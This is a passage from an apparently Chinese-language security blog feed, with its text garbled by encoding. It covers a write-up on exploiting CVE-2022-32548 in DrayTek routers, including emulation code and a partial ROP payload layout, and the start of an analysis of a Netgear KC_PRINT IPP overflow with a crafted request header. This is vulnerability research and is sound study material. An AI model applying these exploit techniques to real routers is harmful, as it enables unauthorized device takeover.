class="number">0x11ff004</span>) <span class="comment"># hjack PC to target functio start address</span></span><br><span class="line">    ql.hook_address(hook_3, <span class="number">0x807768F8</span>)</span><br><span class="line">    <span class="comment"># ql.hook_mem_unmapped(memroy_fix)</span></span><br><span class="line">    ql.debugger = <span class="literal">True</span></span><br><span class="line">    ql.run(begin=<span class="number">0x807766EC</span>)</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨æ€è·¯ï¼š</p><p>[x] ret2shellcode :<br>    åœ¨å°è¯•è¿™ä¸ªæ–¹æ³•çš„æ—¶å€™ï¼Œ å‘ç°æ²¡æ³•æ‰§è¡Œ shellcodeï¼Œ çŒœæµ‹æ˜¯ æŒ‡ä»¤æµæ°´çº¿  cache incoherency  ç‰¹æ€§ï¼Œ å¯èƒ½éœ€è¦åˆ·æ–°æŒ‡ä»¤ï¼Œ ä½†æ˜¯è°ƒç”¨äº†ä¸ª <code>usleep(10000)</code></p><p>è™½ç„¶çœ‹èµ·æ¥ PC å¾€åç§»åŠ¨äº†ï¼Œ ä½†æ˜¯ä»ç„¶æ²¡æ‰§è¡ŒæˆåŠŸï¼Œ åŸå› ä¸æ˜ã€‚</p><p>[âœ“] rop chain</p><p>åœ¨é€†å‘ä¸€äº› cmdlist çš„è¿‡ç¨‹ä¸­ï¼Œ å‘ç°ä¸€ä¸ªä¿®æ”¹å¯†ç æ¥å£</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-30-be60d5f11a1865aa7487931264edfee5-8e53df.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-30-be60d5f11a1865aa7487931264edfee5-8e53df.png"></a></p><p>äºæ˜¯æˆ‘è·³è½¬åˆ°è¿™ä¸ªåœ°æ–¹ï¼Œ ä¿®æ”¹å¯†ç  ã€‚è¿™é‡Œæœ‰ä¸€äº›éœ€è¦è·³è¿‡å‘ç‚¹ï¼Œå…·ä½“å¯ä»¥ç•™ç»™æ„Ÿå…´è¶£çš„è¯»è€…äº†ã€‚è¿™é‡Œæä¾›ä¸€ä¸ª PoC ç»™è¯»è€…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pay = flat(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment"># 0: b&#x27;admi1\x00\x00\x00&#x27;,</span></span><br><span class="line">        <span class="comment"># 8: shellcode,</span></span><br><span class="line">        <span class="number">272</span>: p32(<span class="number">0xdeadbea0</span>),   <span class="comment"># s0 -&gt; </span></span><br><span class="line">        <span class="number">276</span>: p32(<span class="number">0xdeadbea1</span>),   <span class="comment"># s1 </span></span><br><span class="line">        <span class="number">280</span>: p32(<span class="number">0xdeadbea2</span>),   <span class="comment"># s2 -&gt;</span></span><br><span class="line">        <span class="number">284</span>: p32(<span class="number">0xdeadbea3</span>),   <span class="comment"># s3</span></span><br><span class="line">        <span class="number">288</span>: p32(<span class="number">0xdeadbea4</span>),   <span class="comment"># s4</span></span><br><span class="line">        <span class="number">292</span>: p32(<span class="number">0xdeadbea5</span>),   <span class="comment"># s5</span></span><br><span class="line">        <span class="number">296</span>: p32(<span class="number">0xdeadbea6</span>),   <span class="comment"># s6</span></span><br><span class="line">        <span class="number">308</span>: p32(<span class="number">0xdeadbeaf</span>),   <span class="comment"># ra </span></span><br><span class="line">        <span class="number">360</span>: p32(<span class="number">0x808EC000</span>),   <span class="comment"># </span></span><br><span class="line">        <span class="number">372</span>: p32(<span class="number">0x808EC000</span>),   <span class="comment">#</span></span><br><span class="line">        <span class="number">372</span>+<span class="number">0x40</span> +<span class="number">4</span>: p32(<span class="number">0xdeadbeaf</span>),   <span class="comment"># next ra </span></span><br><span class="line">        <span class="number">432</span>: p32(<span class="number">0xdeadbeaf</span>)   <span class="comment"># next v2 </span></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="è¡¥å……"><a href="#è¡¥å……" class="headerlink" title="è¡¥å……"></a>è¡¥å……</h2><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-30-1383c80801d983eb6a2e3ca3bd499a9b-75928d.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-30-1383c80801d983eb6a2e3ca3bd499a9b-75928d.png"></a></p><p>cmdlist  ä¸­ä¸€ä¸ªåŠŸèƒ½å¯ä»¥ç”¨æ¥dumpå†…å­˜ï¼Œæ–¹ä¾¿è°ƒè¯• ã€‚ ä½†æ˜¯æ³¨æ„è¿™é‡Œçš„ 0x800000, æˆ‘ä»¬éœ€è¦è®¾ç½®å½“å‰ç”¨æˆ·çš„æƒé™ä¸º 0x800000ã€‚ è¿™é‡Œå°±æ˜¯å¦å¤–ä¸€ä¸ªæŒ‘æˆ˜äº†ï¼Œä¹Ÿç•™ç»™è¯»è€…è‡ªå·±è§£å†³å§ã€‚ 2333</p><h2 id="Reference-link"><a href="#Reference-link" class="headerlink" title="Reference link"></a>Reference link</h2><p>[^1]: <a href="https://fw.draytek.com.tw/Vigor2925/">Index of /Vigor2925 (draytek.com.tw)</a><br>[^2]: <a href="https://www.youtube.com/watch?v=CD8HfjdDeuM">HEXACON2022 - Emulate it until you make it! Pwning a DrayTek Router by Philippe Laulheret - YouTube</a><br>[^3]: <a href="https://github.com/sgayou/rbasefind">sgayou/rbasefind: A firmware base address search tool. (github.com)</a><br>[^4]: <a href="https://www.trellix.com/en-us/about/newsroom/stories/research/rce-in-dratyek-routers.html">Unauthenticated Remote Code Execution in a Wide Range of DrayTek Vigor Routers (trellix.com)</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´åˆ†æ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> CVE-2022-32548 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nccgroup Pwn2Own ä¸­æ”»ç ´ Netgear R6700è·¯ç”±å™¨çš„æ¼æ´åˆ†æ</title>
      <link href="nccgroup-in-pwn2own-pwned-netgear-r6700-route-vulnerability-analysis.html"/>
      <url>nccgroup-in-pwn2own-pwned-netgear-r6700-route-vulnerability-analysis.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å‰å‡ å¤© sectoday æ¨äº†ä¸€ä¸ªå…³äº <code>NCC ç ”ç©¶å‘˜å‚åŠ  Pwn2Own Austin 2021 æ¯”èµ›æ”»ç ´è·¯ç”±å™¨ã€NASã€æ‰“å°æœºçš„æŠ€æœ¯ç»†èŠ‚åˆ†äº«</code> çš„æ¨é€ã€‚</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-e66939850217aae2c222c419224b1d80-7753dc.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-e66939850217aae2c222c419224b1d80-7753dc.png"></a></p><p>å…¶ä¸­æœ‰ä¸€ä¸ªç¯‡ç« æ˜¯è®² Netgear  R6700 Router çš„ï¼Œ æ°å¥½æˆ‘ä¸Šä¸Šç¯‡åˆ†äº«çš„æ–‡ç«  <a href="https://bestwing.me/PSV-2020-0437-Buffer-Overflow-on-Some-Netgear-outers.html">PSV-2020-0437:Buffer-Overflow-on-Some-Netgear-Routers</a> æ‰€ä½¿ç”¨çš„è·¯ç”±å™¨å‹å·ä»¥åŠå›ºä»¶ç‰ˆæœ¬ä¹Ÿåœ¨è¯¥æ¼æ´å½±å“èŒƒå›´ä¹‹å†…ã€‚å› æ­¤æ‰“ç®—åˆ†æè¿™ä¸ªæ¼æ´ï¼Œå¹¶è‡ªå·±å†™ä¸€ä¸‹è¿™ä¸ªæ¼æ´çš„ exploit ã€‚</p><p>æ³¨ï¼š</p><p>åˆ†æä»¥åŠåˆ©ç”¨çš„è·¯ç”±å™¨å‹å·ä¸ºï¼š R6400v2 ï¼Œ å›ºä»¶ç‰ˆæœ¬ä¸ºï¼šV1.0.4.102_10.0.75</p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>é€šè¿‡ slide å¯ä»¥å¾—çŸ¥ï¼Œ nccgroup æ‰€å‘ç°çš„æ¼æ´åœ¨ <code>KC_PRINT</code>  è¿™ä¸ªç¨‹åºé‡Œï¼Œæ‰€æ”»å‡»ç«¯å£ä¸º <code>631</code> ç«¯å£ã€‚ æ ¹æ®æˆ‘æµ…è–„çš„çŸ¥è¯†ï¼Œç¬¬ä¸€åæ˜ è¿™æ˜¯ä¸€ä¸ªå’Œ IPP (Internet Printing Protocolï¼Œç¼©å†™IPP, æ˜¯ä¸€ä¸ªç”¨äºé€šè¿‡äº’è”ç½‘æ‰“å°æ–‡ä»¶çš„æ ‡å‡†ç½‘ç»œåè®®) æœ‰å…³çš„ç¨‹åºã€‚ åœ¨åé¢çš„è¿›ä¸€æ­¥åˆ†æçš„è¿‡ç¨‹ä¸­ï¼Œç¡®å®éªŒè¯äº†æˆ‘çš„çŒœæƒ³ã€‚</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-20a0f61dacf5f6c238e2e5917b83659f-4734c8.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-20a0f61dacf5f6c238e2e5917b83659f-4734c8.png"></a></p><p><code>KC_PRINT</code> ä½¿ç”¨ä¸åŒçš„çº¿ç¨‹æ¥å¤„ç†ä¸åŒçš„åŠŸèƒ½ï¼Œ </p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-1d0be4ee778833f6e89bf8f2b9769be9-750d1f.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-1d0be4ee778833f6e89bf8f2b9769be9-750d1f.png"></a></p><p>è€Œè¯¥æ¼æ´æ˜¯å‘ç”Ÿåœ¨ <code>ipp_server</code> çº¿ç¨‹é‡Œé¢çš„ã€‚ å…¶å¤§è‡´å…¥å£ä»£ç å¦‚ä¸‹:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( setsockopt(fd, <span class="number">1</span>, <span class="number">2</span>, &amp;optval, <span class="number">4u</span>) &lt; <span class="number">0</span> )</span><br><span class="line"> &#123;</span><br><span class="line">   perror(<span class="string">&quot;ipp_server: setsockopt SO_REUSEADDR failed&quot;</span>);</span><br><span class="line">   close(fd);</span><br><span class="line">   pthread_attr_destroy(&amp;attr);</span><br><span class="line">   pthread_exit(<span class="number">0</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> s.sa_family = <span class="number">2</span>;</span><br><span class="line"> *(_DWORD *)&amp;s.sa_data[<span class="number">2</span>] = htonl(<span class="number">0</span>);</span><br><span class="line"> *(_WORD *)s.sa_data = htons(<span class="number">631u</span>); </span><br><span class="line"> <span class="keyword">if</span> ( bind(fd, &amp;s, <span class="number">0x10</span>u) &lt; <span class="number">0</span> ) <span class="comment">// åœ¨ 631 ç«¯å£ç›‘å¬</span></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line"> listen(fd, <span class="number">128</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ( flag )</span><br><span class="line"> &#123;</span><br><span class="line">   newfd = accept(fd, &amp;addr, &amp;addr_len);</span><br><span class="line">   <span class="keyword">if</span> ( newfd &gt;= <span class="number">0</span> )</span><br><span class="line">   &#123;</span><br><span class="line">     sub_A0FC(<span class="number">1</span>);</span><br><span class="line">     v1[<span class="number">0</span>] = <span class="number">60</span>;</span><br><span class="line">     v1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">     <span class="keyword">if</span> ( setsockopt(newfd, <span class="number">1</span>, <span class="number">20</span>, v1, <span class="number">8u</span>) &lt; <span class="number">0</span> )</span><br><span class="line">       perror(<span class="string">&quot;ipp_server: setsockopt SO_RCVTIMEO failed&quot;</span>);</span><br><span class="line">     Fd = <span class="built_in">malloc</span>(<span class="number">8u</span>);</span><br><span class="line">     <span class="keyword">if</span> ( Fd )</span><br><span class="line">     &#123;</span><br><span class="line">       <span class="built_in">memset</span>(Fd, <span class="number">0</span>, <span class="number">8u</span>);</span><br><span class="line">       *Fd = newfd;</span><br><span class="line">       pthread_mutex_lock(&amp;stru_18B40);</span><br><span class="line">       v6 = sub_16068();</span><br><span class="line">       <span class="keyword">if</span> ( v6 &lt; <span class="number">0</span> )</span><br><span class="line">       &#123;</span><br><span class="line">...</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span> <span class="keyword">if</span> ( pthread_create(&amp;dword_18740[v6], &amp;attr, do_ipp_http_thread, Fd) )</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>ç„¶åä¼šè¿›å…¥åˆ°  <code>do_ipp_http_thread</code> å‡½æ•°é‡Œï¼Œ è¯¥å‡½æ•°ä¼šè¿›ä¸€æ­¥è°ƒç”¨ä¸€ä¸ª <code>do_http</code> çš„å‡½æ•°ã€‚ è¯¥å‡½æ•°ç”¨æ¥å¤„ç†å¯¹åº”çš„ IPP åè®®çš„ HTTP è¯·æ±‚ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">n = recv_n(fd, buf, <span class="number">1024</span>);</span><br><span class="line"><span class="keyword">if</span> ( n &lt;= <span class="number">0</span> )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">strstr</span>(buf, <span class="string">&quot;100-continue&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line">HTTP_INPUT = <span class="built_in">strstr</span>(buf, <span class="string">&quot;POST /USB&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !HTTP_INPUT )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">HTTP_INPUT += <span class="number">9</span>;</span><br><span class="line">v18 = <span class="built_in">strstr</span>(HTTP_INPUT, <span class="string">&quot;_LQ&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !v18 )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">v13 = *v18;</span><br><span class="line">*v18 = <span class="number">0</span>;</span><br><span class="line">usblp_index = atoi(HTTP_INPUT);</span><br><span class="line">*v18 = v13;</span><br><span class="line"><span class="keyword">if</span> ( usblp_index &gt; <span class="number">10</span> )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span> ( !is_printer_connected(usblp_index) )     <span class="comment">// æ£€æŸ¥æ˜¯å¦æœ‰æ‰“å°æœºè®¾å¤‡æŒ‚è½½</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">v22[<span class="number">1</span>] = usblp_index;</span><br><span class="line">HTTP_INPUT = <span class="built_in">strstr</span>(buf, <span class="string">&quot;Content-Length: &quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !HTTP_INPUT )</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line">HTTP_INPUT += <span class="number">16</span>;</span><br><span class="line">v18 = <span class="built_in">strstr</span>(HTTP_INPUT, <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !v18 )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">v13 = *v18;</span><br><span class="line">*v18 = <span class="number">0</span>;</span><br><span class="line">content_len = atoi(HTTP_INPUT);</span><br><span class="line">*v18 = v13;</span><br><span class="line"><span class="built_in">memset</span>(recv_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(recv_buf));</span><br><span class="line">n = recv(fd, recv_buf, <span class="number">8u</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( n != <span class="number">8</span> )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span> ( (recv_buf[<span class="number">2</span>] || recv_buf[<span class="number">3</span>] != <span class="number">2</span>) &amp;&amp; (recv_buf[<span class="number">2</span>] || recv_buf[<span class="number">3</span>] != <span class="number">6</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  v14 = do_airippWithContentLength(v22, content_len, recv_buf);</span><br><span class="line">  <span class="keyword">if</span> ( v14 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆ  <code>  n = recv_n(fd, buf, 1024);</code>  æ¥æ”¶ 1024 çš„æ¶ˆæ¯ï¼Œè¿™ä¸€éƒ¨åˆ†æ¶ˆæ¯ä»¥  <code>\r\n</code> ä½œä¸ºç»“æŸæ ‡è¯†ï¼Œ ç„¶åä¼šå–å‡º <code>Content-Length: </code> çš„å€¼ä½œä¸º  <code>content_len</code> ä¼ å…¥ <code>do_airippWithContentLength</code> å‡½æ•°ä¸­ã€‚</p><p>åœ¨è°ƒç”¨ <code>do_airippWithContentLength</code>  å‡½æ•°ä¹‹å‰ï¼Œ è¿˜ä¼šè¯»å–ä¸€ä¸ª 8 å­—èŠ‚é•¿åº¦çš„æ¶ˆæ¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(recv_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(recv_buf));</span><br><span class="line">n = recv(fd, recv_buf, <span class="number">8u</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>è¯¥ 8 å­—èŠ‚é•¿åº¦çš„æ¶ˆæ¯æœ‰ä¸€å®šçš„æ ¼å¼ï¼Œ å½“æ»¡è¶³ <code>(recv_buf[2] || recv_buf[3] != 2) &amp;&amp; (recv_buf[2] || recv_buf[3] != 6)</code> æ¡ä»¶çš„æ—¶å€™æ‰ä¼šè°ƒç”¨ <code>do_airippWithContentLength</code> å‡½æ•°ã€‚</p><p>ä¸”è¿›å…¥åˆ° <code>do_airippWithContentLength </code>å‡½æ•°åï¼Œ ä¼šæ ¹æ®è¿™ä¸ª 8 ä¸ªå­—èŠ‚é•¿åº¦çš„æ¶ˆæ¯ï¼Œ æ¥å†³å®šè¿›ä¸€æ­¥è°ƒç”¨å“ªä¸ªå‡½æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">do_airippWithContentLength</span><span class="params">(<span class="keyword">int</span> *a1, <span class="keyword">size_t</span> content_len, <span class="keyword">const</span> <span class="keyword">void</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *recv_buf; <span class="comment">// [sp+18h] [bp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [sp+1Ch] [bp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> Jobs; <span class="comment">// [sp+24h] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = *a1;</span><br><span class="line">  recv_buf = <span class="built_in">malloc</span>(content_len);</span><br><span class="line">  <span class="keyword">if</span> ( !recv_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">memcpy</span>(recv_buf, buf, <span class="number">8u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( toRead(v8, (recv_buf + <span class="number">8</span>), content_len - <span class="number">8</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( recv_buf[<span class="number">2</span>] || recv_buf[<span class="number">3</span>] != <span class="number">11</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( recv_buf[<span class="number">2</span>] || recv_buf[<span class="number">3</span>] != <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( recv_buf[<span class="number">2</span>] || recv_buf[<span class="number">3</span>] != <span class="number">8</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( recv_buf[<span class="number">2</span>] || recv_buf[<span class="number">3</span>] != <span class="number">9</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( recv_buf[<span class="number">2</span>] || recv_buf[<span class="number">3</span>] != <span class="number">10</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( recv_buf[<span class="number">2</span>] || recv_buf[<span class="number">3</span>] != <span class="number">5</span> )</span><br><span class="line">                Jobs = sub_D0C8(a1, recv_buf);</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                Jobs = Response_Create_Job(a1, recv_buf, content_len);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              Jobs = Response_Get_Jobs(a1, recv_buf, content_len);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            Jobs = Response_Get_Job_Attributes(a1, recv_buf, content_len);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;Client %d: Cancel-Job\n&quot;</span>, v8);</span><br><span class="line">          Jobs = sub_10EA0(a1, recv_buf);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¾‹å¦‚æ­¤å¤„ï¼Œ å¦‚æœæˆ‘ä»¬æƒ³è°ƒç”¨ <code>Response_Get_Jobs</code> å‡½æ•°ï¼Œ æˆ‘ä»¬å°±å¾—è¿›ä¸€æ­¥æ»¡è¶³ <code> recv_buf[2] || recv_buf[3] == 10</code>  çš„æ¡ä»¶ï¼Œ æ‰èƒ½è¿›åˆ° <code>Response_Get_Jobs</code> å‡½æ•°é‡Œã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ å¦‚ä¸‹çš„æ¶ˆæ¯ï¼š</p><p><code>b&#39;\x00\x00\x00\x0a\x00\x00\x99\x99&#39;</code>  è®©å…¶æ»¡è¶³ä¸‹æ ‡ä¸º 3 çš„æ—¶å€™ ä¸º <code>10</code>  å³å¯ã€‚ </p><p>å¦å¤–ï¼Œ åœ¨ <code>do_http</code> å‡½æ•°ä¸­æœ‰ä¸€ä¸ª <code>  if ( !is_printer_connected(usblp_index) )     // æ£€æŸ¥æ˜¯å¦æœ‰æ‰“å°æœºè®¾å¤‡æŒ‚è½½</code> çš„åˆ¤æ–­ï¼Œè¯¥å‡½æ•°ä¼šè¯»å– <code>/proc/printer_status</code> çš„å†…å®¹æ¥åˆ¤æ–­æ˜¯å¦æœ‰æ‰“å°æœºæŒ‚è½½ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( printer_status )</span><br><span class="line">&#123;</span><br><span class="line">  fd = open(<span class="string">&quot;/proc/printer_status&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(printer_status, <span class="number">0</span>, <span class="number">0x400</span>u);</span><br><span class="line">    v7 = read(fd, printer_status, <span class="number">0x400</span>u);</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">if</span> ( v7 &gt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(printer_status + v7) = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">      <span class="built_in">snprintf</span>(s, <span class="number">0x10</span>u, <span class="string">&quot;usblp%d&quot;</span>, usblp_index - <span class="number">1</span>);</span><br><span class="line">      v7 = <span class="built_in">strstr</span>(printer_status, s) != <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">free</span>(printer_status);</span><br><span class="line">      printer_status = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> v7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      ...</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘æ²¡æœ‰æŒ‚è½½æ‰“å°æœºï¼Œå› æ­¤æˆ‘é€šè¿‡ gdb æ¥ç»•è¿‡è¿™ä¸ªåˆ¤æ–­ã€‚</p><p>æ­¤æ—¶å·²ç»è¿›åˆ° <code>do_airippWithContentLength</code> å‡½æ•°ï¼Œ  è¯¥å‡½æ•°ä¼šè¿›ä¸€æ­¥æ ¹æ® <code>content-len - 8</code>  